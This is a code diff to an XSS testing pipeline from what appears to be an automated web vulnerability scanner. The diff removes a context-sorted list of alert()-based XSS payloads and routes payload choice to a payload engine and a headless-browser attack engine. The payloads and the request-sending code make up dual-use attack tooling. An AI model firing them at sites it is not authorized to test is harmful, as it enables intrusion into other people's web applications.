@@ -10,68 +10,58 @@ Para DOM XSS e casos autenticados → BrowserAttackEngine (Fase 4).
 from __future__ import annotations
 
 import re
-import uuid
 from typing import List, Tuple
 
+from core.browser_attack_engine import BrowserAttackConfig, BrowserAttackEngine
+from core.config import get_config
+from core.payload_engine import PayloadEngine
 from core.models import QueueItem
 from plugins.pipelines import BasePipeline, _HttpResult, _http_send
 
 
-# Payloads por contexto de injeção
-_PAYLOADS_BY_CONTEXT = {
-    "HTML_BODY": [
-        "<script>alert(document.domain)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        "<details open ontoggle=alert(1)>",
-        "<video><source onerror=alert(1)>",
-    ],
-    "ATTRIBUTE": [
-        '" onmouseover="alert(1)',
-        "' onfocus='alert(1)' autofocus='",
-        '" autofocus onfocus="alert(1)',
-        '" onload="alert(1)',
-    ],
-    "JS_STRING": [
-        "'; alert(document.domain); //",
-        '"; alert(document.domain); //',
-        "`${alert(1)}`",
-        "\\'; alert(1); //",
-    ],
-    "URL": [
-        "javascript:alert(document.domain)",
-        "data:text/html,<script>alert(1)</script>",
-    ],
-    "HEADER": [
-        "<script>alert(1)</script>",
-        '"><img src=x onerror=alert(1)>',
-    ],
-}
-
-_PAYLOADS_GENERIC = _PAYLOADS_BY_CONTEXT["HTML_BODY"]
+_BROWSER_CONTEXTS = {"DOM", "JS_TEMPLATE", "CSS", "JSON"}
 
 
 class XssPipeline(BasePipeline):
     name = "XssPipeline"
     MAX_ATTEMPTS = 5
 
-    def _get_payloads(self, item: QueueItem) -> List[str]:
-        return _PAYLOADS_BY_CONTEXT.get(item.context, _PAYLOADS_GENERIC)
-
-    def _execute(self, item: QueueItem, payload: str) -> Tuple[str, _HttpResult]:
-        # Usar marcador único para detecção inequívoca
-        marker = f"RF{uuid.uuid4().hex[:8]}"
-        tagged_payload = payload.replace("alert(1)", f"alert('{marker}')").replace(
-            "alert(document.domain)", f"alert('{marker}')"
+    def __init__(self):
+        super().__init__()
+        self.payload_engine = PayloadEngine()
+        self.browser_engine = BrowserAttackEngine(
+            BrowserAttackConfig.from_mapping(get_config("browser_attack", {}))
         )
 
+    def _get_payloads(self, item: QueueItem) -> List[str]:
+        return self.payload_engine.get_payloads(
+            context=item.context,
+            category="xss",
+            candidate_payload=item.candidate_payload,
+            max_payloads=self.MAX_ATTEMPTS,
+        )
+
+    def run_attempt(self, item: QueueItem, attempt_num: int):
+        payload = self._select_payload(item, attempt_num)
+        if self._needs_browser(item):
+            attempt = self.browser_engine.run_attack(
+                item=item,
+                payload=payload,
+                attempt_number=attempt_num,
+                mode="xss",
+            )
+            attempt.executor = f"{self.name}/Browser"
+            return attempt
+        return super().run_attempt(item, attempt_num)
+
+    def _execute(self, item: QueueItem, payload: str) -> Tuple[str, _HttpResult]:
         url = item.endpoint or item.target
         param = item.parameter
 
         if item.method.upper() == "POST":
-            return _http_send(url, method="POST", data={param: tagged_payload} if param else {})
+            return _http_send(url, method="POST", data={param: payload} if param else {})
         else:
-            params = {param: tagged_payload} if param else {}
+            params = {param: payload} if param else {}
             return _http_send(url, method="GET", params=params)
 
     def _verify(self, result: _HttpResult, payload: str, item: QueueItem) -> str:
@@ -113,3 +103,7 @@ class XssPipeline(BasePipeline):
             return "partial"
 
         return "failed"
+
+    @staticmethod
+    def _needs_browser(item: QueueItem) -> bool:
+        return (item.context or "").upper() in _BROWSER_CONTEXTS
